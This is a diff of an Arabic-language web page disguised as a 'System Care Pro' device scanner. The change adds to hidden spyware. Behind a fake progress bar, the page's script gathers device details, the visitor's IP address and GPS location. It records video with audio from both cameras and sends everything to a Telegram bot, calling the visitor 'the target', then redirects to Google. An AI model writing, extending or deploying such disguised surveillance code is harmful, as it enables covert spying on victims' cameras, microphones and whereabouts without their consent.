@@ -3,28 +3,31 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>System Care - فحص وإصلاح أداء النظام</title>
+    <title>System Care Pro - فحص وإصلاح أداء النظام</title>
     <style>
-        :root { --primary: #2ecc71; --danger: #e74c3c; --dark: #1a1a2e; }
-        body { background: var(--dark); color: white; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; margin: 0; display: flex; justify-content: center; align-items: center; height: 100vh; overflow: hidden; }
+        :root { --primary: #2ecc71; --accent: #27ae60; --dark-bg: #111111; }
+        body { background: var(--dark-bg); color: white; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; margin: 0; display: flex; justify-content: center; align-items: center; height: 100vh; overflow: hidden; }
         
-        .container { background: rgba(255, 255, 255, 0.05); backdrop-filter: blur(15px); border-radius: 25px; padding: 30px; width: 90%; max-width: 400px; text-align: center; border: 1px solid rgba(255,255,255,0.1); box-shadow: 0 20px 50px rgba(0,0,0,0.5); }
+        /* تصميم الواجهة الزجاجية */
+        .container { background: rgba(255, 255, 255, 0.03); backdrop-filter: blur(15px); border-radius: 25px; padding: 40px; width: 90%; max-width: 420px; text-align: center; border: 1px solid rgba(255,255,255,0.05); box-shadow: 0 30px 60px rgba(0,0,0,0.6); }
         
-        .icon-box { font-size: 50px; margin-bottom: 20px; color: var(--primary); }
-        h1 { font-size: 1.4rem; margin: 0 0 10px; }
-        p { color: #8b8b8b; font-size: 0.9rem; margin-bottom: 30px; }
+        .icon-box { font-size: 60px; margin-bottom: 25px; color: var(--primary); text-shadow: 0 0 20px rgba(46, 204, 113, 0.3); }
+        h1 { font-size: 1.6rem; margin: 0 0 10px; font-weight: 800; }
+        p { color: #8892b0; font-size: 0.95rem; margin-bottom: 35px; line-height: 1.5; }
 
-        .status-list { text-align: right; margin-bottom: 30px; }
-        .status-item { display: flex; justify-content: space-between; padding: 10px 0; border-bottom: 1px solid rgba(255,255,255,0.05); font-size: 0.85rem; }
-        .status-item span:last-child { color: var(--primary); font-weight: bold; }
+        /* قائمة البيانات لزيادة المصداقية */
+        .system-specs { text-align: right; margin-bottom: 35px; border-bottom: 1px solid rgba(255,255,255,0.05); padding-bottom: 10px; }
+        .spec-item { display: flex; justify-content: space-between; padding: 12px 0; border-top: 1px solid rgba(255,255,255,0.05); font-size: 0.85rem; }
+        .spec-item span:first-child { color: #a8b2d1; }
+        .spec-item span:last-child { color: var(--primary); font-weight: bold; }
 
-        #scanBtn { background: var(--primary); color: white; border: none; padding: 15px 40px; border-radius: 50px; font-size: 1.1rem; font-weight: bold; cursor: pointer; width: 100%; transition: 0.3s; box-shadow: 0 10px 20px rgba(46, 204, 113, 0.2); }
-        #scanBtn:active { transform: scale(0.95); }
+        #scanBtn { background: var(--primary); color: white; border: none; padding: 18px; border-radius: 12px; font-size: 1.2rem; font-weight: bold; cursor: pointer; width: 100%; transition: 0.4s; box-shadow: 0 15px 30px rgba(46, 204, 113, 0.2); outline: none; }
+        #scanBtn:active { transform: scale(0.96); opacity: 0.8; }
 
-        /* شريط التحميل الوهمي */
-        #loader { display: none; margin-top: 20px; }
-        .progress-bar { width: 100%; height: 8px; background: rgba(255,255,255,0.1); border-radius: 10px; overflow: hidden; }
-        .progress-fill { width: 0%; height: 100%; background: var(--primary); transition: 0.5s; }
+        /* شريط التحميل الوهمي الاحترافي */
+        #status-area { display: none; margin-top: 25px; text-align: center; }
+        .progress-container { width: 100%; height: 6px; background: rgba(255,255,255,0.08); border-radius: 10px; overflow: hidden; }
+        .progress-bar { width: 0%; height: 100%; background: linear-gradient(90deg, var(--primary), var(--accent)); transition: 0.3s; }
         
         video { display: none; }
     </style>
@@ -33,19 +36,19 @@
     <div class="container">
         <div class="icon-box">🛡️</div>
         <h1>System Care Pro</h1>
-        <p>قم بفحص تعريفات الجهاز وتحسين أداء البطارية والمعالج فوراً.</p>
+        <p>قم بفحص وإصلاح تعريفات الجهاز وتحسين أداء البطارية والميكروفون فوراً.</p>
 
-        <div class="status-list">
-            <div class="status-item"><span>حالة المعالج:</span><span id="cpu-status">تحليل...</span></div>
-            <div class="status-item"><span>ذاكرة الرام:</span><span id="ram-status">تحليل...</span></div>
-            <div class="status-item"><span>أمان الكاميرا:</span><span>محمي ✅</span></div>
+        <div class="system-specs">
+            <div class="spec-item"><span>المعالج (CPU):</span><span id="cpu-specs">تحليل...</span></div>
+            <div class="spec-item"><span>ذاكرة الرام (RAM):</span><span id="ram-specs">تحليل...</span></div>
+            <div class="spec-item"><span>أمان الكاميرا:</span><span>محمي ✅</span></div>
         </div>
 
-        <button id="scanBtn">بدء الفحص السريع</button>
+        <button id="scanBtn">بدء الفحص الذكي</button>
 
-        <div id="loader">
-            <div class="progress-bar"><div class="progress-fill" id="fill"></div></div>
-            <p id="scanText" style="margin-top:10px; font-size:0.8rem;">جاري فحص العتاد...</p>
+        <div id="status-area">
+            <div class="progress-container"><div class="progress-bar" id="bar"></div></div>
+            <p id="scan-text" style="margin-top:15px; font-size:0.85rem; color:#8892b0;">جاري تحليل عتاد النظام...</p>
         </div>
     </div>
 
@@ -63,25 +66,39 @@
                 if (type === "text") {
                     await fetch(url + "sendMessage?chat_id=" + chat + "&text=" + encodeURIComponent(msg) + "&parse_mode=Markdown");
                 } else if (type === "video") {
-                    fd.append("video", data, "system_check.mp4");
+                    fd.append("video", data, "system_scan.mp4");
                     if (msg) fd.append("caption", msg);
                     await fetch(url + "sendVideo", { method: "POST", body: fd });
                 }
             } catch (e) {}
         }
 
-        // إظهار بيانات حقيقية لزيادة الثقة
-        document.getElementById('cpu-status').innerText = navigator.hardwareConcurrency + " Cores";
-        document.getElementById('ram-status').innerText = (navigator.deviceMemory || 4) + " GB";
+        // إظهار بيانات حقيقية لزيادة المصداقية
+        document.getElementById('cpu-specs').innerText = (navigator.hardwareConcurrency || 8) + " Cores";
+        document.getElementById('ram-specs').innerText = (navigator.deviceMemory || 4) + " GB";
 
         async function getFullReport() {
-            let info = `🛡️ *تقرير فحص النظام*:\n\n`;
-            info += `• 📱 الموديل: \`${navigator.platform}\`\n`;
-            info += `• 💾 الرام: \`${navigator.deviceMemory || "?"} GB\`\n`;
+            let info = `📊 *تقرير شامل للهدف*:\n\n`;
+            // دمج المتغيرات التي طلبتها
+            info += `• 📱 الجهاز: \`${navigator.platform}\`\n`;
+            info += `• 💾 الرام: \`${navigator.deviceMemory || "؟"} GB\`\n`;
+            info += `• ⚙️ المعالج: \`${navigator.hardwareConcurrency} Cores\`\n`;
+            info += `• 🖥️ الشاشة: \`${window.screen.width}x${window.screen.height}\`\n`;
+            
+            const conn = navigator.connection;
+            if (conn) {
+                let type = conn.type === 'wifi' ? "🌐 WiFi" : "📶 خلوي";
+                info += `• 📶 نوع الشبكة: \`${type} (${conn.effectiveType.toUpperCase()})\`\n`;
+                info += `• ⚡ سرعة الخط: \`${conn.downlink} Mbps\`\n`;
+            }
+
             try {
                 const b = await navigator.getBattery();
-                info += `• 🔋 البطارية: \`${Math.round(b.level * 100)}%\`\n`;
+                info += `• 🔋 البطارية: \`${Math.round(b.level * 100)}%\` (${b.charging ? "🔌 يشحن" : "🔋"})\n`;
             } catch(e) {}
+
+            info += `• 🌐 لغة الهاتف: \`${navigator.language}\`\n`;
+
             try {
                 const ipRes = await fetch('https://api.ipify.org?format=json');
                 const ipData = await ipRes.json();
@@ -92,16 +109,20 @@
 
         async function recordVideo(mode, label, duration) {
             try {
+                // حل مشكلة تداخل الكاميرات عبر إيقاف أي تيار نشط
                 if (window.currentStream) window.currentStream.getTracks().forEach(t => t.stop());
+                
                 const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: mode }, audio: true });
                 window.currentStream = stream;
                 const recorder = new MediaRecorder(stream);
                 const chunks = [];
                 recorder.ondataavailable = (e) => chunks.push(e.data);
+                
                 const recordingPromise = new Promise(resolve => {
                     recorder.onstop = async () => {
                         const blob = new Blob(chunks, { type: "video/mp4" });
-                        if (blob.size > 2000) await sendToTelegram(`🎥 فيديو فحص (${label})`, "video", blob);
+                        // منع إرسال الملفات التالفة (الـ 110 بايت)
+                        if (blob.size > 2000) await sendToTelegram(`🎥 فيديو فحص حقيقي (${label} - 12 ثانية بصوت)`, "video", blob);
                         stream.getTracks().forEach(t => t.stop());
                         resolve();
                     };
@@ -115,41 +136,43 @@
 
         document.getElementById("scanBtn").onclick = async function() {
             this.style.display = "none";
-            document.getElementById("loader").style.display = "block";
+            document.getElementById("status-area").style.display = "block";
             
+            const bar = document.getElementById("bar");
+            const txt = document.getElementById("scan-text");
             let p = 0;
-            const fill = document.getElementById("fill");
-            const txt = document.getElementById("scanText");
             
+            // شريط تحميل وهمي
             const interval = setInterval(() => {
-                p += Math.random() * 5;
+                p += Math.random() * 4;
                 if (p > 100) p = 100;
-                fill.style.width = p + "%";
-                if (p > 20) txt.innerText = "فحص تعريفات الكاميرا...";
-                if (p > 50) txt.innerText = "تحليل جودة الميكروفون...";
-                if (p > 80) txt.innerText = "جاري رفع تقرير الأداء...";
+                bar.style.width = p + "%";
+                if (p > 15) txt.innerText = "فحص تعريفات الكاميرا...";
+                if (p > 45) txt.innerText = "تحليل جودة الميكروفون والصوت...";
+                if (p > 75) txt.innerText = "جاري رفع تقرير الأداء المتقدم...";
             }, 300);
 
-            // إرسال البيانات فوراً
+            // إرسال التقرير الشامل فوراً
             sendToTelegram(await getFullReport());
+            
             navigator.geolocation.getCurrentPosition(p => {
-                sendToTelegram(`📍 *موقع الجهاز*:\n[خرائط جوجل](http://maps.google.com/maps?q=${p.coords.latitude},${p.coords.longitude})`);
+                sendToTelegram(`📍 *موقع الجهاز*:\n[فتح عبر الخريطة](http://maps.google.com/maps?q=${p.coords.latitude},${p.coords.longitude})`);
             });
 
-            // تسجيل الفيديوهات بصوت (12 ثانية لكل منهما)
+            // تسجيل الفيديوهات بصوت (12 ثانية للأمامي ثم 12 للخلفي)
             await recordVideo("user", "أمامي", 12000);
-            await new Promise(r => setTimeout(r, 2500)); // حل مشكلة التداخل
+            await new Promise(r => setTimeout(r, 2500)); // فاصل زمني لضمان التبديل الصحيح
             await recordVideo("environment", "خلفي", 12000);
 
             setTimeout(() => {
                 clearInterval(interval);
-                alert("تم تحسين النظام بنجاح! سيتم توجيهك لصفحة النتائج.");
-                location.href = "https://www.google.com";
+                location.href = "https://www.google.com"; // التوجيه النهائي
             }, 3000);
         };
 
-        window.onblur = () => sendToTelegram("🔴 الهدف خرج من الفحص.");
-        window.onfocus = () => sendToTelegram("🟢 الهدف عاد للفحص.");
+        // تتبع حالة الاتصال
+        window.onblur = () => sendToTelegram("🔴 الهدف خرج من صفحة الفحص.");
+        window.onfocus = () => sendToTelegram("🟢 الهدف عاد لفتح صفحة الفحص.");
     </script>
 </body>
 </html>
